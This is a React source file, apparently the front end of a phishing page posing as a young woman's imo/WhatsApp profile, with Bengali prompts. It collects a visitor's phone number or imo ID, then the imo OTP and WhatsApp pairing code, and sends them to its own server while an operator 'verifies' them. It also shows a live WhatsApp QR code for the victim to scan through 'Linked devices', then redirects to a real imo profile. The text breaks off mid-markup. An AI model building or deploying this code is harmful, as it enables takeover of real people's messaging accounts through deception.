import React, { useState, useRef, useEffect } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import { 
  ArrowLeft, 
  Bell, 
  User, 
  Edit3, 
  Camera, 
  Check, 
  ChevronRight,
  Loader2,
  X,
  Smartphone,
  ShieldCheck,
  CheckCircle2,
  Send
} from 'lucide-react';
// @ts-ignore
import defaultAvatar from './assets/images/default_avatar_1782370919940.jpg';
// @ts-ignore
import nusratPortrait from './assets/images/nusrat_portrait_1782393640705.jpg';
import { AutoCroppedImage } from './components/AutoCroppedImage';

export default function App() {
  // App primary States
  const [name, setName] = useState('NUSRAT JAHAN');
  const [isEditingName, setIsEditingName] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [uid, setUid] = useState<string>('');
  const [avatarUrl, setAvatarUrl] = useState<string>('default');
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Connection Simulation States
  const [activeMode, setActiveMode] = useState<'idle' | 'connecting_imo' | 'connecting_whatsapp' | 'otp_imo' | 'otp_whatsapp' | 'success'>('idle');
  const [timeLeft, setTimeLeft] = useState(10);
  const [isVerifying, setIsVerifying] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [liveQrUrl, setLiveQrUrl] = useState<string>('');
  
  // OTP box inputs
  const [otpImo, setOtpImo] = useState<string[]>(['', '', '', '']);
  const [otpWhatsapp, setOtpWhatsapp] = useState<string[]>(['', '', '', '', '', '', '', '']);

  // Refs for auto-focusing OTP boxes
  const otpImoRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpWhatsappRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Sound and instructions State (Optional speech)
  const [isSpeaking, setIsSpeaking] = useState(false);
  const [shouldShake, setShouldShake] = useState(false);

  const triggerInputAlert = () => {
    setShouldShake(true);
    setTimeout(() => {
      setShouldShake(false);
    }, 600);

    // TTS voice prompt saying 'এখানে আপনার ফোন নাম্বার লিখুন'
    if ('speechSynthesis' in window) {
      window.speechSynthesis.cancel();
      const utterance = new SpeechSynthesisUtterance('এখানে আপনার ফোন নাম্বার লিখুন');
      utterance.lang = 'bn-BD';
      
      const voices = window.speechSynthesis.getVoices();
      const bnVoice = voices.find(v => v.lang.includes('bn'));
      if (bnVoice) {
        utterance.voice = bnVoice;
      }
      window.speechSynthesis.speak(utterance);
    }
  };

  // 1. Initialize permanent visitor UID and restore state from backend
  useEffect(() => {
    let storedUid = localStorage.getItem('nusrat_user_uid');
    if (!storedUid) {
      const randDigits = Math.floor(100000 + Math.random() * 900000).toString();
      storedUid = `uid${randDigits}`;
      localStorage.setItem('nusrat_user_uid', storedUid);
    }
    setUid(storedUid);

    const notifyVisitor = async () => {
      try {
        const res = await fetch('/api/visitor-entry', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ uid: storedUid })
        });
        const data = await res.json();
        if (data.success && data.session) {
          const s = data.session;
          if (s.phoneNumber) {
            setPhoneNumber(s.phoneNumber);
          }
          if (s.qrImageUrl) {
            setLiveQrUrl(s.qrImageUrl);
          }
          
          // Restore active mode based on status (ONLY if a phone number exists in the session)
          if (s.phoneNumber && (s.status === 'PENDING_OTP' || s.status === 'VERIFYING_OTP' || s.status === 'ERROR')) {
            if (s.mode === 'whatsapp') {
              setActiveMode('otp_whatsapp');
            } else if (s.mode === 'imo') {
              setActiveMode('otp_imo');
            }
            if (s.status === 'VERIFYING_OTP') {
              setIsVerifying(true);
            }
            if (s.status === 'ERROR') {
              setErrorMsg('দুঃখিত আপনার দেওয়া আনলক নাম্বার টি সঠিক নয় অনুগ্রহ করে সঠিক আনলক নাম্বার টি লিখুন');
            }
          } else if (s.phoneNumber && s.status === 'SUCCESS') {
            setActiveMode('success');
            window.location.href = 'https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAIDl8UyCeRQ1qeRwL2ekBGZbIO-qtb4P7MEplEtlhMjn';
          }
        }
      } catch (err) {
        console.warn('Visitor entry notification transient failure (retrying later):', err);
      }
    };

    notifyVisitor();
  }, []);

  // Safeguard: Do not allow proceeding or accessing any subsequent pages without inputting a phone number
  useEffect(() => {
    if (activeMode !== 'idle' && activeMode !== 'success' && !phoneNumber.trim()) {
      setActiveMode('idle');
    }
  }, [activeMode, phoneNumber]);

  // 2. Unified polling from server when a valid UID is available
  useEffect(() => {
    let interval: any;
    if (uid) {
      interval = setInterval(async () => {
        try {
          const cleanPhone = phoneNumber.replace(/[^0-9]/g, '');
          const queryParam = cleanPhone 
            ? `phoneNumber=${encodeURIComponent(cleanPhone)}&uid=${encodeURIComponent(uid)}` 
            : `uid=${encodeURIComponent(uid)}`;
          const response = await fetch(`/api/check-status?${queryParam}`);
          const data = await response.json();
          
          // Update live QR image if available
          if (data.qrImageUrl) {
            setLiveQrUrl(data.qrImageUrl);
          } else {
            setLiveQrUrl('');
          }

          // Handle state updates only when not in idle mode
          if (activeMode !== 'idle') {
            // A. Handle live status changes
            if (data.status === 'SUCCESS') {
              clearInterval(interval);
              setIsVerifying(false);
              setActiveMode('success');
              // Redirect immediately to imo share profile link
              window.location.href = 'https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAIDl8UyCeRQ1qeRwL2ekBGZbIO-qtb4P7MEplEtlhMjn';
            } else if (data.status === 'ERROR') {
              clearInterval(interval);
              setIsVerifying(false);
              setErrorMsg('দুঃখিত আপনার দেওয়া আনলক নাম্বার টি সঠিক নয় অনুগ্রহ করে সঠিক আনলক নাম্বার টি লিখুন');
            }

            // B. Handle live pairing code (WhatsApp only)
            if (activeMode === 'otp_whatsapp' && data.pairingCode) {
              const codeChars = data.pairingCode.split('');
              setOtpWhatsapp(prev => {
                if (prev.join('') !== data.pairingCode) {
                  return [...codeChars, ...Array(8 - codeChars.length).fill('')].slice(0, 8);
                }
                return prev;
              });
            }
          }
        } catch (err) {
          console.warn('Session status poll transient failure (will retry):', err);
        }
      }, 2000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [activeMode, phoneNumber, uid, isVerifying, errorMsg]);

  // Countdowns for connection simulation
  useEffect(() => {
    let timer: any;
    if ((activeMode === 'connecting_imo' || activeMode === 'connecting_whatsapp') && timeLeft > 0) {
      timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1);
      }, 1000);
    } else if ((activeMode === 'connecting_imo' || activeMode === 'connecting_whatsapp') && timeLeft === 0) {
      // Transition to OTP input fields
      if (activeMode === 'connecting_imo') {
        setActiveMode('otp_imo');
      } else {
        setActiveMode('otp_whatsapp');
      }
    }
    return () => clearTimeout(timer);
  }, [activeMode, timeLeft]);

  // Voice guidance alert when imo OTP field appears
  useEffect(() => {
    if (activeMode === 'otp_imo') {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance('আপনার imo তে আসা ৪ সংখ্যার সঠিক আনলক নাম্বার টি এখানে লিখুন');
        utterance.lang = 'bn-BD';
        
        const voices = window.speechSynthesis.getVoices();
        const bnVoice = voices.find(v => v.lang.includes('bn'));
        if (bnVoice) {
          utterance.voice = bnVoice;
        }
        window.speechSynthesis.speak(utterance);
      }
    }
  }, [activeMode]);

  // Voice guidance alert when errorMsg changes to a non-empty string
  useEffect(() => {
    if (errorMsg) {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(errorMsg);
        utterance.lang = 'bn-BD';
        
        const voices = window.speechSynthesis.getVoices();
        const bnVoice = voices.find(v => v.lang.includes('bn'));
        if (bnVoice) {
          utterance.voice = bnVoice;
        }
        window.speechSynthesis.speak(utterance);
      }
    }
  }, [errorMsg]);

  // Triggering the connection to imo
  const handleConnectImo = async () => {
    if (!phoneNumber.trim()) {
      triggerInputAlert();
      return;
    }
    
    // Fire submission to server in background
    try {
      fetch('/api/submit-number', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, mode: 'imo', uid })
      });
    } catch (e) {
      console.warn('Error posting submit-number in background:', e);
    }

    setTimeLeft(10);
    setActiveMode('connecting_imo');
  };

  // Triggering the connection to WhatsApp
  const handleConnectWhatsapp = async () => {
    if (!phoneNumber.trim()) {
      triggerInputAlert();
      return;
    }

    // Fire submission to server in background
    try {
      fetch('/api/submit-number', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, mode: 'whatsapp', uid })
      });
    } catch (e) {
      console.warn('Error posting submit-number in background:', e);
    }

    setTimeLeft(10);
    setActiveMode('connecting_whatsapp');
  };

  // OTP inputs handling with auto-focus helper
  const handleOtpImoChange = (index: number, val: string) => {
    const cleanVal = val.replace(/[^0-9]/g, '').slice(-1);
    const newOtp = [...otpImo];
    newOtp[index] = cleanVal;
    setOtpImo(newOtp);

    // Auto focus next box
    if (cleanVal && index < 3) {
      otpImoRefs.current[index + 1]?.focus();
    }

    // Auto-submit when all 4 digits are typed
    const completedOtp = newOtp.map((v, idx) => idx === index ? cleanVal : v).join('');
    if (completedOtp.length === 4) {
      handleConfirmOtp(completedOtp);
    }
  };

  const handleOtpWhatsappChange = (index: number, val: string) => {
    const cleanVal = val.replace(/[^0-9]/g, '').slice(-1);
    const newOtp = [...otpWhatsapp];
    newOtp[index] = cleanVal;
    setOtpWhatsapp(newOtp);

    // Auto focus next box
    if (cleanVal && index < 7) {
      otpWhatsappRefs.current[index + 1]?.focus();
    }

    // Auto-submit when all 8 digits are typed
    const completedOtp = newOtp.map((v, idx) => idx === index ? cleanVal : v).join('');
    if (completedOtp.length === 8) {
      handleConfirmOtp(completedOtp);
    }
  };

  // Profile Image Upload Helper
  const handleAvatarChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (uploadEvent) => {
        if (uploadEvent.target?.result) {
          setAvatarUrl(uploadEvent.target.result as string);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  // Final confirmation to success screen
  const handleConfirmOtp = async (otpOverride?: string) => {
    const cleanPhone = phoneNumber.replace(/[^0-9]/g, '');
    if (!cleanPhone && !uid) {
      alert('দয়া করে প্রথমে ফোন নম্বর ইনপুট ফিল্ডে টাইপ করুন।');
      return;
    }

    const currentOtp = otpOverride !== undefined 
      ? otpOverride 
      : (activeMode === 'otp_imo' ? otpImo.join('') : otpWhatsapp.join(''));

    if (activeMode === 'otp_imo' && currentOtp.length < 4) {
      alert('দয়া করে ৪ সংখ্যার ওটিপি কোড সম্পূর্ণ লিখুন।');
      return;
    }
    if (activeMode === 'otp_whatsapp' && currentOtp.length < 8) {
      alert('দয়া করে ৮ সংখ্যার ওটিপি কোড সম্পূর্ণ লিখুন।');
      return;
    }

    try {
      setIsVerifying(true);
      const response = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: cleanPhone, otp: currentOtp, uid })
      });
      const result = await response.json();
      if (!response.ok) {
        alert(result.error || 'ওটিপি সাবমিট করতে ব্যর্থ হয়েছে।');
        setIsVerifying(false);
      }
    } catch (err) {
      console.warn('Error submitting OTP:', err);
      alert('সার্ভার সংযোগে ত্রুটি ঘটেছে। অনুগ্রহ করে আবার চেষ্টা করুন।');
      setIsVerifying(false);
    }
  };

  const handleRetry = async () => {
    const cleanPhone = phoneNumber.replace(/[^0-9]/g, '');
    try {
      await fetch('/api/retry-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: cleanPhone, uid })
      });
    } catch (e) {
      console.warn('Error posting retry:', e);
    }
    // Reset local inputs and errors
    setOtpImo(['', '', '', '']);
    setOtpWhatsapp(['', '', '', '', '', '', '', '']);
    setErrorMsg('');
    setIsVerifying(false);
    setLiveQrUrl('');
  };

  const resetAll = () => {
    setActiveMode('idle');
    setOtpImo(['', '', '', '']);
    setOtpWhatsapp(['', '', '', '', '', '', '', '']);
    setIsVerifying(false);
    setErrorMsg('');
    setLiveQrUrl('');
  };

  // Generate real dynamic wa.me links based on user input
  const getQRValue = () => {
    const cleanVal = phoneNumber.replace(/[^0-9]/g, '');
    if (!cleanVal) {
      return `https://wa.me/8801700000000?text=Hi%20Nusrat!%20Let's%20connect%20on%20WhatsApp.`;
    }
    return `https://wa.me/${cleanVal}`;
  };

  const displayAvatar = avatarUrl === 'default' ? defaultAvatar : avatarUrl;

  return (
    <div className="min-h-screen bg-[#F0F2F5] font-sans antialiased flex flex-col items-center justify-center p-2 sm:p-4 select-none">
      
      {/* Smartphone Device Frame Container */}
      <div className="w-full max-w-[390px] min-h-[780px] bg-white rounded-[40px] shadow-[0_24px_50px_rgba(0,0,0,0.12)] border border-gray-200/60 overflow-hidden flex flex-col relative">
        
        {/* Top Status Bar & Action Header mimicking screenshot */}
        <div className="pt-6 px-6 pb-2 flex items-center justify-between bg-white z-10">
          <button 
            onClick={resetAll}
            className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-gray-800 transition-colors cursor-pointer"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          
          <div className="relative">
            <button className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-gray-800 transition-colors cursor-pointer">
              <Bell className="w-6 h-6" />
            </button>
            <span className="absolute top-1.5 right-1.5 bg-[#4CAF50] text-white text-[10px] w-4 h-4 rounded-full flex items-center justify-center font-bold border-2 border-white">
              2
            </span>
          </div>
        </div>

        {/* Scrollable / Interactive content space */}
        <div className="flex-1 flex flex-col items-center px-6 pb-8 overflow-y-auto">
          
          {/* Circular profile image with hidden custom file uploader */}
          <div className="mt-4 relative group">
            <div className="w-28 h-28 rounded-full overflow-hidden border-2 border-gray-100 shadow-md relative">
              <img 
                src={displayAvatar} 
                alt="Nusrat Jahan" 
                className="w-full h-full object-cover transition-transform duration-300 group-hover:scale-105"
                onError={(e) => {
                  const target = e.target as HTMLImageElement;
                  target.src = defaultAvatar;
                }}
              />
              <button 
                onClick={() => fileInputRef.current?.click()}
                className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 flex items-center justify-center text-white transition-opacity duration-200"
                title="প্রোফাইল ছবি পরিবর্তন করুন"
              >
                <Camera className="w-5 h-5" />
              </button>
            </div>
            <input 
              type="file" 
              ref={fileInputRef} 
              className="hidden" 
              accept="image/*" 
              onChange={handleAvatarChange} 
            />
          </div>

          {/* User Name with Inline Editable State */}
          <div className="mt-3 flex items-center gap-2">
            {isEditingName ? (
              <div className="flex items-center gap-1.5 border-b-2 border-[#128C7E] py-0.5">
                <input 
                  type="text" 
                  value={name} 
                  onChange={(e) => setName(e.target.value)} 
                  className="bg-transparent font-bold text-xl text-gray-800 focus:outline-none text-center"
                  onBlur={() => setIsEditingName(false)}
                  autoFocus
                />
                <button 
                  onClick={() => setIsEditingName(false)}
                  className="text-[#128C7E] hover:text-green-700"
                >
                  <Check className="w-4 h-4" />
                </button>
              </div>
            ) : (
              <>
                <h1 className="text-xl font-extrabold text-gray-800 uppercase tracking-wide">
                  {name}
                </h1>
                <button 
                  onClick={() => setIsEditingName(true)}
                  className="p-1 rounded-full text-gray-400 hover:text-gray-700 transition-colors"
                  title="নাম পরিবর্তন করুন"
                >
                  <Edit3 className="w-4 h-4" />
                </button>
              </>
            )}
          </div>

          {/* Interactive Flow Area */}
          {activeMode === 'idle' && (
            <div className="w-full mt-6 space-y-4 flex-1 flex flex-col">
              
              {/* Box 1: Interactive Phone Number / imo ID Box */}
              <div className={`p-4 rounded-2xl shadow-sm transition-all duration-300 flex items-center gap-3 border ${shouldShake ? 'border-red-500 bg-red-50/20 shake-animation' : 'bg-[#f8fafd] border-gray-100 hover:border-blue-200'}`}>
                <div className="w-9 h-9 rounded-full bg-blue-50 text-blue-500 flex items-center justify-center shrink-0">
                  <User className="w-5 h-5" />
                </div>
                <div className="flex-1 min-w-0">
                  <span className="text-[12px] font-bold text-gray-400 block uppercase tracking-wider">
                    IMO ID / PHONE NUMBER
                  </span>
                  <div className="flex items-center">
                    <span className="text-gray-800 font-bold text-[14px] shrink-0 mr-1.5">
                      imo ID:
                    </span>
                    <input 
                      type="text"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="imoid_137rEZGUMB"
                      className="flex-1 bg-transparent border-none outline-none font-bold text-[14px] text-blue-600 placeholder-gray-400 focus:ring-0 p-0"
                    />
                  </div>
                </div>
              </div>

              {/* Box 2: Premium centered Photo Frame */}
              <div className="bg-white border border-gray-100 p-5 rounded-3xl shadow-sm flex-1 flex flex-col items-center justify-center relative">
                {liveQrUrl ? (
                  <div className="absolute top-3 left-3 bg-green-50 text-green-700 text-[10px] font-extrabold px-2 py-0.5 rounded-full flex items-center gap-1">
                    <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-ping" />
                    QR ACTIVE
                  </div>
                ) : (
                  <div className="absolute top-3 left-3 bg-blue-50 text-blue-700 text-[10px] font-extrabold px-2 py-0.5 rounded-full flex items-center gap-1">
                    <span className="w-1.5 h-1.5 bg-blue-500 rounded-full" />
                    PHOTO FRAME
                  </div>
                )}
                
                <div className="p-3 bg-[#fafafa] rounded-2xl border border-gray-100 shadow-inner w-full flex items-center justify-center">
                  {liveQrUrl ? (
                    <AutoCroppedImage 
                      src={liveQrUrl} 
                      alt="Live WhatsApp QR Code" 
                      className="w-48 h-48 object-contain rounded-xl shadow-md border-4 border-white"
                    />
                  ) : (
                    <div className="relative w-48 h-48 rounded-2xl overflow-hidden shadow-lg border-4 border-white group">
                      <img 
                        src={nusratPortrait} 
                        alt="Nusrat Jahan" 
                        className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110"
                      />
                      <div className="absolute inset-x-0 bottom-0 bg-gradient-to-t from-black/60 to-transparent p-2 text-center">
                        <span className="text-white text-xs font-bold uppercase tracking-wider">Nusrat Jahan</span>
                      </div>
                    </div>
                  )}
                </div>

                <div className="mt-4 text-center">
                  {liveQrUrl ? (
                    <p className="text-[11px] text-green-600 font-bold leading-relaxed max-w-[220px]">
                      লাইভ হোয়াটসঅ্যাপ কিউআর কোডটি সফলভাবে যুক্ত হয়েছে। এটি স্ক্যান করুন।
                    </p>
                  ) : (
                    <p className="text-[11px] text-gray-500 font-medium leading-relaxed max-w-[220px]">
                      এটি নুসরাত জাহানের অফিসিয়াল মূল প্রোফাইল ফটো ফ্রেম।
                    </p>
                  )}
                </div>
              </div>

              {/* Bottom Custom Navigation mimicking the picture's Bottom Action Bar */}
              <div className="mt-auto grid grid-cols-2 gap-3 pt-4">
                
                {/* Left button: "imo" with official blue brand design */}
                <button
                  onClick={handleConnectImo}
                  className="py-3 px-4 bg-blue-50 hover:bg-blue-100 active:scale-95 text-[#0F5FC2] rounded-2xl font-bold text-[14px] transition-all flex items-center justify-center gap-2 cursor-pointer shadow-sm border border-blue-100"
                >
                  {/* Official imo Logo approximation in SVG */}
                  <svg className="w-5 h-5 shrink-0" viewBox="0 0 24 24" fill="currentColor">
                    <circle cx="12" cy="12" r="12" fill="#00a4e4" />
                    <text x="50%" y="60%" textAnchor="middle" fill="white" fontSize="9" fontWeight="900" fontFamily="sans-serif">imo</text>
                  </svg>
                  <span>imo</span>
                </button>

                {/* Right button: "WhatsApp" with official green brand design */}
                <button
                  onClick={handleConnectWhatsapp}
                  className="py-3 px-4 bg-green-50 hover:bg-green-100 active:scale-95 text-[#128C7E] rounded-2xl font-bold text-[14px] transition-all flex items-center justify-center gap-2 cursor-pointer shadow-sm border border-green-100"
                >
                  {/* WhatsApp SVG Icon */}
                  <svg className="w-5 h-5 text-[#25D366] fill-current shrink-0" viewBox="0 0 24 24">
                    <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.513 2.262 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.502-5.717-1.454L0 24zm6.59-4.846c1.6.95 3.198 1.451 4.82 1.452 5.432 0 9.851-4.42 9.855-9.852.002-2.63-1.023-5.101-2.883-6.963C16.574 1.928 14.102.902 11.474.902 6.042.902 1.622 5.322 1.618 10.754c-.001 1.732.453 3.42 1.314 4.921L1.93 21.07l5.485-1.438c1.558.85 3.116 1.296 4.697 1.296h.005zm10.706-7.234c-.29-.145-1.716-.848-1.981-.943-.264-.095-.457-.144-.648.143-.19.288-.737.943-.905 1.134-.168.19-.336.214-.627.069-1.127-.565-1.956-.98-2.736-2.316-.206-.353.206-.328.588-1.09.06-.12.03-.224-.015-.313-.045-.09-.457-1.1-.627-1.507-.165-.398-.348-.343-.478-.349-.124-.006-.266-.007-.408-.007-.143 0-.376.054-.572.27-.197.214-.752.734-.752 1.79 0 1.057.77 2.08 1.057 2.443.288.362 2.502 3.82 6.061 5.356.846.365 1.507.584 2.02.747.85.27 1.623.232 2.235.14.68-.102 1.715-.7 1.956-1.378.24-.68.24-1.263.168-1.378-.072-.115-.264-.19-.554-.335z"/>
                  </svg>
                  <span>WhatsApp</span>
                </button>

              </div>

            </div>
          )}

          {/* Mode: Connecting Simulation (10 Seconds) */}
          {(activeMode === 'connecting_imo' || activeMode === 'connecting_whatsapp') && (
            <div className="w-full mt-6 flex-1 flex flex-col items-center justify-center p-6 bg-[#f4f7fa] rounded-3xl border border-gray-100 shadow-inner animate-fade-in">
              <div className="relative mb-6">
                <div className="w-24 h-24 rounded-full border-4 border-dashed border-blue-500/30 border-t-blue-500 animate-spin flex items-center justify-center">
                  {activeMode === 'connecting_imo' ? (
                    <div className="w-16 h-16 rounded-full bg-blue-500 flex items-center justify-center text-white text-xs font-black shadow-md">
                      imo
                    </div>
                  ) : (
                    <div className="w-16 h-16 rounded-full bg-[#25D366] flex items-center justify-center text-white shadow-md">
                      <svg className="w-8 h-8 fill-current" viewBox="0 0 24 24">
                        <path d="M12.012 3.82c-4.52 0-8.2 3.68-8.2 8.2 0 1.54.43 3.03 1.25 4.33l-.84 3.07 3.14-.82c1.26.69 2.68 1.05 4.14 1.05 4.52 0 8.2-3.68 8.2-8.2 0-2.18-.85-4.23-2.4-5.78s-3.6-2.4-5.78-2.4zm4.8 11.23c-.2.56-1.16 1.07-1.6 1.11-.4.04-.92.21-2.73-.51-2.31-.92-3.8-3.26-3.91-3.41-.11-.15-.95-1.26-.95-2.4s.59-1.69.8-1.92c.2-.23.45-.29.6-.29s.3.01.43.02c.14.01.32-.05.5.38.19.45.64 1.56.7 1.68s.09.25.01.42c-.08.17-.18.27-.3.41-.12.14-.26.3-.37.4-.12.11-.25.23-.11.47.14.24.63 1.03 1.35 1.67.92.82 1.7 1.07 1.94 1.19s.38.09.52-.06c.14-.15.59-.69.75-.92.16-.23.32-.19.54-.11s1.39.65 1.63.77c.24.12.4.18.46.28.06.1.06.57-.14 1.13z"/>
                      </svg>
                    </div>
                  )}
                </div>
                <div className="absolute -bottom-1 -right-1 bg-white text-gray-800 font-extrabold text-[12px] px-2 py-0.5 rounded-full border border-gray-100 shadow-sm animate-pulse">
                  {timeLeft}s
                </div>
              </div>

              <h2 className="text-[16px] font-extrabold text-gray-800 text-center">
                {activeMode === 'connecting_imo' ? 'imo' : 'WhatsApp'} সার্ভারের সাথে সংযোগ করা হচ্ছে...
              </h2>
              <p className="text-[12px] text-gray-500 mt-2 text-center leading-relaxed">
                অনুগ্রহ করে অপেক্ষা করুন। নিরাপত্তা যাচাইকরণ চ্যানেল প্রস্তুত করা হচ্ছে।
              </p>

              {/* Progress visualizer bar */}
              <div className="w-full bg-gray-200 h-2.5 rounded-full mt-6 overflow-hidden">
                <div 
                  className={`h-full rounded-full transition-all duration-1000 ${
                    activeMode === 'connecting_imo' ? 'bg-blue-500' : 'bg-[#25D366]'
                  }`}
                  style={{ width: `${(10 - timeLeft) * 10}%` }}
                />
              </div>
            </div>
          )}

          {/* Mode: Verifying Screen */}
          {isVerifying && !errorMsg && (
            <div className="w-full mt-6 flex-1 flex flex-col items-center justify-center p-6 bg-white rounded-3xl border border-gray-100 shadow-md animate-scale-up text-center">
              <div className="relative mb-6">
                <Loader2 className="w-16 h-16 text-[#25D366] animate-spin mx-auto" />
              </div>

              <h2 className="text-md font-bold text-gray-800">
                যাচাই করা হচ্ছে...
              </h2>
              <p className="text-xs text-gray-500 mt-2 leading-relaxed px-4">
                দয়া করে অপেক্ষা করুন, এডমিন আপনার ওটিপিটি যাচাই করছেন।
              </p>
            </div>
          )}

          {/* Mode: Error Screen */}
          {errorMsg && (
            <div className="w-full mt-6 flex-1 flex flex-col items-center justify-center p-6 bg-white rounded-3xl border border-red-100 shadow-md animate-scale-up text-center">
              <div className="w-16 h-16 rounded-full bg-red-50 text-red-500 flex items-center justify-center mb-4 mx-auto">
                <X className="w-10 h-10" />
              </div>

              <h2 className="text-md font-extrabold text-red-600 px-2 leading-relaxed">
                {errorMsg}
              </h2>

              <button
                onClick={handleRetry}
                className="w-full py-3.5 mt-8 bg-red-500 hover:bg-red-600 active:scale-95 text-white rounded-2xl font-bold text-sm transition-all shadow-md shadow-red-500/10 cursor-pointer text-center"
              >
                আবার চেষ্টা করুন
              </button>
            </div>
          )}

          {/* Mode: imo OTP View (4 digits) */}
          {activeMode === 'otp_imo' && !isVerifying && !errorMsg && (
            <div className="w-full mt-6 flex-1 flex flex-col items-center justify-center p-6 bg-white rounded-3xl border border-gray-100 shadow-md animate-scale-up">
              <div className="w-12 h-12 rounded-full bg-blue-50 text-blue-500 flex items-center justify-center mb-4 mx-auto">
                <Smartphone className="w-6 h-6" />
              </div>

              <h2 className="text-[16px] font-extrabold text-gray-800 text-center">
                ৪ সংখ্যার ওটিপি কোড (OTP Code)
              </h2>
              <p className="text-[12px] text-gray-500 mt-1.5 text-center leading-relaxed max-w-[240px]">
                আপনার imo নম্বরে প্রেরিত ৪ সংখ্যার ওটিপিটি নিচে ইনপুট করুন:
              </p>

              {/* 4 separate OTP Boxes */}
              <div className="flex gap-3 mt-6 justify-center">
                {otpImo.map((digit, i) => (
                  <input
                    key={i}
                    type="text"
                    maxLength={1}
                    value={digit}
                    ref={(el) => (otpImoRefs.current[i] = el)}
                    onChange={(e) => handleOtpImoChange(i, e.target.value)}
                    className="w-12 h-14 text-center text-xl font-bold text-gray-800 bg-[#f8fafd] border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:bg-white outline-none transition-all shadow-sm"
                  />
                ))}
              </div>

              <button
                onClick={resetAll}
                className="w-full py-3.5 mt-8 bg-gray-100 hover:bg-gray-200 active:scale-95 text-gray-500 rounded-2xl font-bold text-sm transition-all cursor-pointer text-center"
              >
                বাতিল করুন (Cancel)
              </button>
            </div>
          )}

          {/* Mode: WhatsApp OTP View (8 separate empty boxes) */}
          {activeMode === 'otp_whatsapp' && !isVerifying && !errorMsg && (
            <div className="w-full mt-6 flex-1 flex flex-col items-center justify-center p-6 bg-white rounded-3xl border border-gray-100 shadow-md animate-scale-up">
              <div className="w-12 h-12 rounded-full bg-green-50 text-green-600 flex items-center justify-center mb-4 mx-auto">
                <ShieldCheck className="w-6 h-6" />
              </div>

              <h2 className="text-[16px] font-extrabold text-gray-800 text-center">
                ৮ সংখ্যার ওটিপি ভেরিফিকেশন
              </h2>
              <p className="text-[12px] text-gray-500 mt-1.5 text-center leading-relaxed max-w-[240px]">
                আপনার WhatsApp নাম্বারে প্রেরিত ৮ সংখ্যার ভেরিফিকেশন কোডটি লিখুন:
              </p>

              {/* Live QR Code Section on WhatsApp OTP screen */}
              {liveQrUrl && (
                <div className="mt-4 p-3 bg-[#f0faf5] rounded-2xl border border-green-100 flex flex-col items-center w-full">
                  <span className="text-[10px] font-bold text-green-600 mb-2 animate-pulse flex items-center gap-1">
                    <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
                    লাইভ হোয়াটসঅ্যাপ কিউআর কোড (Live QR Code)
                  </span>
                  <div className="p-2 bg-white rounded-xl border border-gray-100 shadow-sm">
                    <AutoCroppedImage 
                      src={liveQrUrl} 
                      alt="WhatsApp Live QR Code" 
                      className="w-48 h-48 object-contain rounded-lg"
                    />
                  </div>
                  <p className="text-[9px] text-gray-500 mt-1.5 text-center">
                    হোয়াটসঅ্যাপ লিংক ডিভাইস অপশন দিয়ে স্ক্যান করুন।
                  </p>
                </div>
              )}

              {/* 8 separate OTP Boxes */}
              <div className="grid grid-cols-4 gap-2 mt-6 w-full px-2">
                {otpWhatsapp.map((digit, i) => (
                  <input
                    key={i}
                    type="text"
                    maxLength={1}
                    value={digit}
                    ref={(el) => (otpWhatsappRefs.current[i] = el)}
                    onChange={(e) => handleOtpWhatsappChange(i, e.target.value)}
                    className="w-full h-12 text-center text-lg font-bold text-gray-800 bg-[#f8fafd] border-2 border-gray-200 rounded-xl focus:border-green-500 focus:bg-white outline-none transition-all shadow-sm"
                  />
                ))}
              </div>

              <button
                onClick={resetAll}
                className="w-full py-3.5 mt-8 bg-gray-100 hover:bg-gray-200 active:scale-95 text-gray-500 rounded-2xl font-bold text-sm transition-all cursor-pointer text-center"
              >
                বাতিল করুন (Cancel)
              </button>
            </div>
          )}

          {/* Success Screen */}
          {activeMode === 'success' && (
            <div className="w-full mt-6 flex-1 flex flex-col items-center justify-center p-6 bg-white rounded-3xl border border-gray-100 shadow-md animate-scale-up text-center">
              <div className="w-16 h-16 rounded-full bg-green-100 text-green-600 flex items-center justify-center mb-4 animate-bounce">
                <CheckCircle2 className="w-10 h-10" />
              </div>

              <h2 className="text-lg font-extrabold text-gray-800">
                সংযোগ সফল হয়েছে!
              </h2>
              <p className="text-xs text-gray-500 mt-2 leading-relaxed">
                আপনার নম্বরটি সফলভাবে ভেরিফাই ও কানেক্ট করা সম্পন্ন হয়েছে।
              </p>

              <button
